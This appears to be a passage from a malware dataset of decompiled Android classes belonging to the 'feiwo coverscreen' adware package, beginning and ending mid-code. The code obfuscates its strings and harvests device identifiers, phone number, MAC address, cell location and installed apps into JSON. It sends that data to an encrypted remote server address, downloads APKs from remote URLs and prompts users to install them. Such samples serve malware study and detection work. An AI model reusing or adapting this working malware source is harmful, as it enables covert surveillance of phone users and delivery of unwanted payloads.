String str,  String str2){     JSONObject jSONObject=new JSONObject();     String a=ai.a(context);     String b=ai.b();     ah.a();     String a2=ah.a(context,false);     String str3=ai.d(context).a + ""*"" + ai.d(context).b;     String a3=ai.a();     String d=ai.d();     String c2=ai.c();     String c3=J.a(context).c();     String b2=J.a(context).b();     String e=J.a(context).e();     ao d2=ai.d(context);     String str4=d2.a + ""*"" + d2.b;     String b3=ai.b(context);     String c4=ai.c(context);     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""model_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""packagenames_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""resolution_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""brand_feiwocp"".replace(""_feiwocp"",""""),a3);       jSONObject.put(""versionrelease_feiwocp"".replace(""_feiwocp"",""""),d);       jSONObject.put(""versioncode_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""appkey_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c4);       jSONObject.put(""call_id_feiwocp"".replace(""_feiwocp"",""""),c3);       jSONObject.put(""mac_feiwocp"".replace(""_feiwocp"",""""),b3);       jSONObject.put(""screen_size_feiwocp"".replace(""_feiwocp"",""""),str4);       jSONObject.put(""mobile_num_feiwocp"".replace(""_feiwocp"",""""),e);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b2);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.f107c);     }  catch (    JSONException e2) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  JSONArray jSONArray){     String a=ai.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""installCount_feiwocp"".replace(""_feiwocp"",""""),jSONArray);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.f107c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public String a(){     return this.b;   }   public String b(){     return this.f100c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public int e(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\I.code","public final class I {   private static final String a=R.a(""H8Zno4EBTQx9HFCC0rcAQqd931fYhjBLaFEZBiEdBCo=_feiwocp"".replace(""_feiwocp"",""""),R.a(""123456_feiwocp"".replace(""_feiwocp"","""")));   public static String a(){     return a + ""/webviewAdClick_feiwocp"".replace(""_feiwocp"","""");   }   public static String b(){     return a + ""/showCount_feiwocp"".replace(""_feiwocp"","""");   }   public static String c(){     return a + ""/"" + ""clientinfo_feiwocp"".replace(""_feiwocp"","""");   }   public static String d(){     return a + ""/installCount_feiwocp"".replace(""_feiwocp"","""");   }   public static String e(){     return a + ""/getCoverScreenAdList_feiwocp"".replace(""_feiwocp"","""");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\J.code","public class J {   private static J a;   private String b;   private String f101c;   private String d;   private String e;   private String f;   public J(){   }   private J(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone_feiwocp"".replace(""_feiwocp"",""""));       String networkOperator=telephonyManager.getNetworkOperator();       this.b=networkOperator.substring(0,3);       this.f101c=networkOperator.substring(3);       if (telephonyManager.getCellLocation() instanceof CdmaCellLocation) {         CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(cdmaCellLocation.getBaseStationId());         this.e=String.valueOf(cdmaCellLocation.getNetworkId());         this.f=telephonyManager.getLine1Number();       }  else       if (telephonyManager.getCellLocation() instanceof GsmCellLocation) {         GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(gsmCellLocation.getCid());         this.e=String.valueOf(gsmCellLocation.getLac());         this.f=telephonyManager.getLine1Number();       }     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static J a(  Context context){     if (a == null) {       a=new J(context);     }     return a;   }   public String a(){     return this.b;   }   public String b(){     return this.f101c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public String e(){     return aq.a(this.f) ? """" : this.f;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\K.code","public final class K {   private static K a=null;   private ExecutorService b;   private Map f102c=new HashMap();   private int d=0;   private int e=0;   private K(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static K a(){     if (a == null) {       a=new K();     }     return a;   }   public static void a(  String str,  String str2){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     r2=null;     fileOutputStream2=null;     HttpURLConnection httpURLConnection3=null;     FileOutputStream fileOutputStream3=null;     File file=new File(str2 + ""."" + System.currentTimeMillis()+ "".temp_feiwocp"".replace(""_feiwocp"",""""));     File file2=new File(str2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(20000);         httpURLConnection2.setReadTimeout(20000);         httpURLConnection2.setRequestMethod(""GET_feiwocp"".replace(""_feiwocp"",""""));         httpURLConnection2.connect();         InputStream inputStream=httpURLConnection2.getInputStream();         FileOutputStream fileOutputStream4=new FileOutputStream(file);         try {           byte[] bArr=new byte[1024];           while (true) {             int read=inputStream.read(bArr);             if (read == -1) {               break;             }  else {               fileOutputStream4.write(bArr,0,read);             }           }           fileOutputStream4.flush();           fileOutputStream4.close();           file.renameTo(file2);           try {             fileOutputStream4.close();             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          IOException e) {           }         }  catch (        FileNotFoundException e2) {           httpURLConnection3=httpURLConnection2;           fileOutputStream=fileOutputStream4;           if (fileOutputStream != null) {             try {               fileOutputStream.close();             }  catch (            IOException e3) {               return;             }           }           if (httpURLConnection3 != null) {             httpURLConnection3.disconnect();           }         } catch (        IOException e4) {           fileOutputStream3=fileOutputStream4;           if (fileOutputStream3 != null) {             try {               fileOutputStream3.close();             }  catch (            IOException e5) {               return;             }           }           if (httpURLConnection2 != null) {             httpURLConnection2.disconnect();           }         } catch (        Throwable th) {           fileOutputStream2=fileOutputStream4;           httpURLConnection=httpURLConnection2;           th=th;           if (fileOutputStream2 != null) {             try {               fileOutputStream2.close();             }  catch (            IOException e6) {               throw th;             }           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           throw th;         }       }  catch (      FileNotFoundException e7) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      IOException e8) {       } catch (      Throwable th2) {         httpURLConnection=httpURLConnection2;         th=th2;       }     }  catch (    FileNotFoundException e9) {       fileOutputStream=null;     } catch (    IOException e10) {       httpURLConnection2=null;     } catch (    Throwable th3) {       th=th3;       httpURLConnection=null;     }   }   public final Bitmap a(  Context context,  String str){     int i;     Bitmap bitmap;     int i2;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i3=options.outWidth;     int i4=options.outHeight;     int i5=i3;     int i6=1;     while (true) {       int i7=i4;       int i8=i5 / 2;       if (this.d > 0) {         i=this.d;       }  else {         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics);         this.d=displayMetrics.widthPixels;         i=displayMetrics.widthPixels;       }       if (i8 <= i) {         break;       }       int i9=i7 / 2;       if (this.e > 0) {         i2=this.e;       }  else {         DisplayMetrics displayMetrics2=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics2);         this.e=displayMetrics2.heightPixels;         i2=this.e;       }       if (i9 <= i2) {         break;       }       i5/=2;       i4=i7 / 2;       i6<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i6;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public final Drawable a(  Context context,  String str,  String str2){     if (str == null || str.equals("""")) {       return null;     }     File file=new File(str2);     if (!file.exists()) {       return null;     }     try {       file.setLastModified(System.currentTimeMillis());       return new BitmapDrawable(a(context,str2));     }  catch (    Exception e) {       return null;     } catch (    OutOfMemoryError e2) {       return null;     }   }   public final Drawable a(  Context context,  String str,  String str2,  N n){     if (this.f102c.containsKey(str)) {       SoftReference softReference=(SoftReference)this.f102c.get(str);       if (softReference.get() != null) {         if (0 != 0) {           softReference.get();         }         return (Drawable)softReference.get();       }     }     this.b.submit(new M(this,context,str,str2,true,new L(this,null,str)));     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\L.code","final class L extends Handler {   private N a;   private String b;   public L(  K k,  N n,  String str){     this.a=n;     this.b=str;   }   @Override public final void handleMessage(  Message message){     if (message.obj == null || this.a == null) {       return;     }     N n=this.a;     Object obj=message.obj;     String str=this.b;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\M.code","public final class M implements Runnable {   private Context a;   private String b;   private String f103c;   private boolean d;   private Handler e;   private K f;   public M(  K k,  Context context,  String str,  String str2,  boolean z,  Handler handler){     this.f=k;     this.a=context;     this.b=str;     this.f103c=str2;     this.d=z;     this.e=handler;   }   @Override public final void run(){     Map map;     Drawable a=this.f.a(this.a,this.b,this.f103c);     new StringBuilder().append(""loadDrawable from method: getDrawableFromCache, drawable: "").append(a).append("", url: "").append(this.b);     if (a == null) {       try {         new StringBuilder().append(""save to file start: "").append(this.f103c).append("", url: "").append(this.b);         K k=this.f;         Context context=this.a;         K.a(this.b,this.f103c);         a=this.f.a(this.a,this.b,this.f103c);       }  catch (      IOException e) {         a=null;         new StringBuilder().append(""save to file failed: "").append(this.f103c).append("", url: "").append(this.b);       }     }     if (this.d && a != null) {       map=this.f.f102c;       map.put(this.b,new SoftReference(a));     }     this.e.sendMessage(this.e.obtainMessage(0,a));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\N.code","public interface N { } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\O.code","public final class O {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b;   private static final byte[] f104c; static {     int[] iArr=new int[256];     b=iArr;     Arrays.fill(iArr,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;     byte[] bArr={65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     f104c=new byte[128];     for (int i2=0; i2 < 128; i2++) {       f104c[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       f104c[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       f104c[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       f104c[i5]=(byte)((i5 - 48) + 52);     }     f104c[43]=62;     f104c[47]=63;   }   public static final String a(  byte[] bArr,  boolean z){     return new String(b(bArr,z));   }   public static final byte[] a(  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.fivefeiwo.coverscreen.O.a(java.lang.String):byte[]"");   }   private static char[] b(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\P.code","public class P {   static P a;   ConcurrentLinkedQueue b;   Map f105c;   Context d;   Handler e;   public P(){   }   private P(  Context context){     this.b=new ConcurrentLinkedQueue();     this.f105c=new ConcurrentHashMap();     this.d=context;     this.e=new Handler();   }   public static P a(){     if (a == null) {       throw new RuntimeException(""DownloadManager is not yet initialize_feiwocp"".replace(""_feiwocp"",""""));     }     return a;   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnected();   }   public static int b(  Context context){     boolean z=true;     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null || !activeNetworkInfo.isConnected()) {       return 0;     }     String typeName=activeNetworkInfo.getTypeName();     if (typeName.equalsIgnoreCase(""WIFI_feiwocp"".replace(""_feiwocp"",""""))) {       return 4;     }     if (!typeName.equalsIgnoreCase(""MOBILE_feiwocp"".replace(""_feiwocp"",""""))) {       return 0;     }     if (!aq.a(Proxy.getDefaultHost())) {       return 1;     } switch (((TelephonyManager)context.getSystemService(""phone"")).getNetworkType()) { case 1:       z=false;     break; case 2:   z=false; break; case 4: z=false; break; case 7: z=false; break; case 11: z=false; break; } return z ? 3 : 2; } public static void c(Context context){ a=new P(context); } public void a(H h){ new StringBuilder().append(""[DownloadManager] removeTask: "").append(h.a()).append("","").append(h.d()); this.f105c.remove(h.d()); } public void a(H h,T t){ new StringBuilder().append(""[DownloadManager] addTask: "").append(h.a()).append("","").append(h.d()); U u=(U)this.f105c.get(h.d()); if (u != null) { u.a(t); return; } U u2=new U(this,h,t); this.f105c.put(h.d(),u2); u2.start(); } public boolean a(String str){ return this.f105c.containsKey(str); } public void b(){ U u=(U)this.b.poll(); while (u != null) { a(u.b,(T)u.a.poll()); u=(U)this.b.poll(); } } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\Q.code","public final class Q implements Serializable {   public static final String a=""download_feiwocp"".replace(""_feiwocp"","""");   public static final String b=""weixin_feiwocp"".replace(""_feiwocp"","""");   public static final String f106c=""weburl_feiwocp"".replace(""_feiwocp"","""");   private int d;   private int e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private String l;   private String m;   private String n;   private String o;   private String p;   private String q;   private String r;   private String s;   private String t;   public static Q a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     Q q=new Q();     q.d=jSONObject.optInt(""id_feiwocp"".replace(""_feiwocp"",""""));     q.e=jSONObject.optInt(""adid_feiwocp"".replace(""_feiwocp"",""""),0);     q.f=jSONObject.optString(""image_feiwocp"".replace(""_feiwocp"",""""));     q.g=jSONObject.optString(""name_feiwocp"".replace(""_feiwocp"",""""));     q.i=jSONObject.optString(""icon_feiwocp"".replace(""_feiwocp"",""""));     q.q=jSONObject.optString(""coverDownloadConfirm_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.r=jSONObject.optString(""notifiKeep_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.s=jSONObject.optString(""gprsDown_feiwocp"".replace(""_feiwocp"",""""),""true_feiwocp"".replace(""_feiwocp"",""""));     q.h=jSONObject.optString(""clickType_feiwocp"".replace(""_feiwocp"",""""));     q.t=jSONObject.optString(""fullClick_feiwocp"".replace(""_feiwocp"",""""),""true"");     q.l=jSONObject.optString(""appicon_feiwocp"".replace(""_feiwocp"",""""));     q.m=jSONObject.optString(""appname_feiwocp"".replace(""_feiwocp"",""""));     q.n=jSONObject.optString(""apppackage_feiwocp"".replace(""_feiwocp"",""""));     q.o=jSONObject.optString(""appurl_feiwocp"".replace(""_feiwocp"",""""));     q.p=jSONObject.optString(""appsize_feiwocp"".replace(""_feiwocp"",""""));     q.j=jSONObject.optString(""wxurl_feiwocp"".replace(""_feiwocp"",""""));     q.k=jSONObject.optString(""weburl_feiwocp"".replace(""_feiwocp"",""""));     return q;   }   public final int a(){     return this.e;   }   public final String b(){     return this.f;   }   public final String c(){     return this.g;   }   public final String d(){     return this.m;   }   public final String e(){     return this.n;   }   public final String f(){     return this.o;   }   public final String g(){     return this.j;   }   public final String h(){     return this.h;   }   public final String i(){     return this.k;   }   public final String j(){     return this.i;   }   public final String k(){     return this.l;   }   public final String l(){     return this.p;   }   public final int m(){     return this.d;   }   public final String n(){     return this.q;   }   public final String o(){     return this.r;   }   public final String p(){     return this.s;   }   public final String q(){     return this.t;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\R.code","public final class R { static {     ""CryptUtils.java_feiwocp"".replace(""_feiwocp"","""");     char[] cArr={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};   }   public static String a(  String str){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(str.substring(0,4));     stringBuffer.append(str.substring(str.length() - 4));     return stringBuffer.toString();   }   public static String a(  String str,  String str2){     if (str == null) {       return null;     }     return new String(c(str,str2));   }   public static String a(  String str,  String str2,  boolean z){     if (str == null) {       return null;     }     return O.a(b(str,str2),false);   }   private static byte[] b(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_feiwocp"".replace(""_feiwocp"",""""));       Cipher cipher=Cipher.getInstance(""DES_feiwocp"".replace(""_feiwocp"",""""));       byte[] bytes=str.getBytes(""utf-8_feiwocp"".replace(""_feiwocp"",""""));       cipher.init(1,secretKeySpec);       return cipher.doFinal(bytes);     }  catch (    UnsupportedEncodingException e) {       return null;     } catch (    InvalidKeyException e2) {       return null;     } catch (    NoSuchAlgorithmException e3) {       return null;     } catch (    BadPaddingException e4) {       return null;     } catch (    IllegalBlockSizeException e5) {       return null;     } catch (    NoSuchPaddingException e6) {       return null;     }   }   private static byte[] c(  String str,  String str2){     if (str == null) {       return null;     }     try {       SecretKeySpec secretKeySpec=new SecretKeySpec(str2.getBytes(),""DES_feiwocp"".replace(""_feiwocp"",""""));       Cipher cipher=Cipher.getInstance(""DES_feiwocp"".replace(""_feiwocp"",""""));       byte[] a=O.a(str);       cipher.init(2,secretKeySpec);       return cipher.doFinal(a);     }  catch (    InvalidKeyException e) {       return null;     } catch (    NoSuchAlgorithmException e2) {       return null;     } catch (    BadPaddingException e3) {       return null;     } catch (    IllegalBlockSizeException e4) {       return null;     } catch (    NoSuchPaddingException e5) {       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0007f.code","public final class RunnableC0007f implements Runnable {   private String a;   private AbstractC0002a b;   public RunnableC0007f(  AbstractC0002a abstractC0002a,  String str){     this.b=abstractC0002a;     this.a=str;   }   @Override public final void run(){     Context context;     aj a=aj.a();     context=this.b.d;     a.a(context,this.a,(am)null);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0008g.code","public final class RunnableC0008g implements Runnable {   private String a;   private AbstractC0002a b;   public RunnableC0008g(  AbstractC0002a abstractC0002a,  String str){     this.b=abstractC0002a;     this.a=str;   }   @Override public final void run(){     Context context;     aj a=aj.a();     context=this.b.d;     a.a(context,this.a,(am)null);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0009h.code","public final class RunnableC0009h implements Runnable {   private Intent a;   private AbstractC0002a b;   public RunnableC0009h(  AbstractC0002a abstractC0002a,  Intent intent){     this.b=abstractC0002a;     this.a=intent;   }   @Override public final void run(){     Context context;     context=this.b.d;     context.startActivity(this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0012k.code","final class RunnableC0012k implements Runnable {   private SA a;   public RunnableC0012k(  SA sa){     this.a=sa;   }   @Override public final void run(){     SA.a(this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0013l.code","final class RunnableC0013l implements Runnable {   private SA a;   public RunnableC0013l(  SA sa){     this.a=sa;   }   @Override public final void run(){     SA.a(this.a);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0015n.code","final class RunnableC0015n implements Runnable {   private String a;   private H b;   private C0014m f117c;   public RunnableC0015n(  C0014m c0014m,  String str,  H h){     this.f117c=c0014m;     this.a=str;     this.b=h;   }   @Override public final void run(){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.a)),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     ae.a(this.f117c.a.b).a(this.b.e() + 12345,android.R.drawable.ic_menu_share,this.b.a(),this.b.a(),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…_feiwocp"".replace(""_feiwocp"",""""),intent,34,this.b.b(),System.currentTimeMillis());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\RunnableC0027z.code","final class RunnableC0027z implements Runnable {   private C0026y a;   public RunnableC0027z(  C0026y c0026y){     this.a=c0026y;   }   @Override public final void run(){     if (this.a.a.a() == null || this.a.a.a().isEmpty()) {       this.a.a.i();     }  else {       this.a.a.f();     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\S.code","public final class S {   public static final String a=""2.1_feiwocp"".replace(""_feiwocp"","""");   public static final String b=""COVERSCREEN_feiwocp"".replace(""_feiwocp"","""");   public static final String f107c=""V1_feiwocp"".replace(""_feiwocp"","""");   public static String d=""/adfeiwo/c-cache/image_feiwocp"".replace(""_feiwocp"","""");   public static String e=""/adfeiwo/c-cache/apk_feiwocp"".replace(""_feiwocp"","""");   public static String f;   public static String g;   public static String h;   public static final String i;   public static final String j;   public static final String k;   public static final String l;   public static final String m;   public static final String n;   public static final String o;   public static final String p;   public static final String q;   public static final String r; static {     ""/adfeiwo/c-cache/log_feiwocp"".replace(""_feiwocp"","""");     f=""coverscreen_close2.png_feiwocp"".replace(""_feiwocp"","""");     g=""coverscreen_download2.png_feiwocp"".replace(""_feiwocp"","""");     h=""coverscreen_clickshow2.png_feiwocp"".replace(""_feiwocp"","""");     ""d_feiwocp"".replace(""_feiwocp"","""");     i=""download_confirm_feiwocp"".replace(""_feiwocp"","""");     j=""DP_FEIWO_feiwocp"".replace(""_feiwocp"","""");     k=""appkey_feiwocp"".replace(""_feiwocp"","""");     l=""showatscreenonplatform_feiwocp"".replace(""_feiwocp"","""");     m=""showatscreenonuser_feiwocp"".replace(""_feiwocp"","""");     ""12345678_feiwocp"".replace(""_feiwocp"","""");     n=""dprate_feiwocp"".replace(""_feiwocp"","""");     o=""dpswitchdelay_feiwocp"".replace(""_feiwocp"","""");     p=""dpnum_feiwocp"".replace(""_feiwocp"","""");     q=""broadcast.route.control.close_feiwocp"".replace(""_feiwocp"","""");     r=""broadcast.route.control_feiwocp"".replace(""_feiwocp"","""");   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.fivefeiwo.coverscreen\SA.code","public final class SA extends Activity {   Context b;   private C0020s f108c;   private List d;   Handler a=new Handler();   private List e=new ArrayList();   private String f=null;   private BroadcastReceiver g=new C0011j(this);   public static void a(  SA sa){     if (CPManager.getInstance() == null) {       sa.finish();       return;     }     sa.f=CPManager.getInstance().d();     int intExtra=sa.getIntent().getIntExtra(""index_feiwocp"".replace(""_feiwocp"",""""),0);     List list=(List)sa.getIntent().getSerializableExtra(""itemList_feiwocp"".replace(""_feiwocp"",""""));     if (list == null || list.isEmpty()) {       sa.finish();       return;     }     DisplayMetrics displayMetrics=new DisplayMetrics();     sa.getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);     int i=displayMetrics.widthPixels;     int i2=displayMetrics.heightPixels;     ap.a(sa,S.j,S.o,10000);     sa.d=list;     if (sa.d.isEmpty()) {       sa.finish();     }  else {       sa.f108c=new A(sa,sa.d,intExtra);       sa.setContentView(sa.f108c,new ViewGroup.LayoutParams(-1,-1));     }   }   public final void a(  Q q){     if (q == null) {       return;     }     new StringBuilder().append(""ç‚¹å‡»ç±»åž‹ï¼š"").append(q.h());     if (P.a(getContext())) {       if (!aq.a(q.e())) {         Intent intent=new Intent(S.r);         intent.putExtra(""type_feiwocp"".replace(""_feiwocp"",""""),1);         intent.putExtra(""packageName_feiwocp"".replace(""_feiwocp"",""""),q.e());         sendBroadcast(intent);       }       JSONObject a=H.a(getContext(),0.0d,0.0d,this.f,0,"""" + q.m(),"""");       ab abVar=new ab();       abVar.a(getContext(),I.a(),this.f,a.toString());       abVar.a(new C0016o(this));       Z.a().a(abVar);       if (Q.a.equals(q.h())) {         if (P.a().a(q.f())) {           Toast.makeText(getApplicationContext(),""å·²åœ¨ä¸‹è½½ä¸­_feiwocp"".replace(""_feiwocp"",""""),0).show();         }  else {           Toast.makeText(getApplicationContext(),""æ­£åœ¨ä¸‹è½½  _feiwocp"".replace(""_feiwocp"","""") + q.d() + "" å�¯åˆ°é€šçŸ¥æ �æŸ¥çœ‹_feiwocp"".replace(""_feiwocp"",""""),0).show();           Y.a();           K.a().a(getContext(),q.k(),Y.a(getContext(),S.d,q.k()),null);           P.a().a(new H(q.a(),q.d(),q.k(),q.e(),q.f()),new C0014m(this,q));         }         if (this.d.isEmpty()) {           finish();           return;         }         return;       }       if (!Q.b.equals(q.h())) {         if (Q.f106c.equals(q.h())) {           Intent intent2=new Intent(this,(Class<?>)WA.class);           intent2.putExtra(""url_feiwocp"".replace(""_feiwocp"",""""),q.i());           startActivity(intent2);           if (this.d.isEmpty()) {             finish();             return;           }           return;         }         return;       }       new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨ï¼š"").append(q.g());       Intent intent3=new Intent();       intent3.setFlags(335544320);       try {         intent3.setClassName(""com.tencent.mm_feiwocp"".replace(""_feiwocp"",""""),""com.tencent.mm.ui.qrcode.GetQRCodeInfoUI_feiwocp"".replace(""_feiwocp"",""""));         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }  catch (      ActivityNotFoundException e) {         new StringBuilder().append(""æ‰“å¼€å¾®ä¿¡å…³æ³¨å¤±è´¥ï¼ˆweixinï¼‰ï¼š"").append(e);         intent3.setAction(""android.intent.action.VIEW"");         intent3.setData(Uri.parse(q.g()));         startActivity(intent3);       }       if (this.d.isEmpty()) {         finish();       }     }   }   public final void b(  Q q){     if (q == null || this.e.contains(Integer.valueOf(q.a()))) {       return;     }     this.e.add(Integer.valueOf(q.a()));     JSONObject a=H.a(getContext(),q.m());     ab abVar=new ab();     abVar.a(getContext(),I.b(),this.f,a.toString());     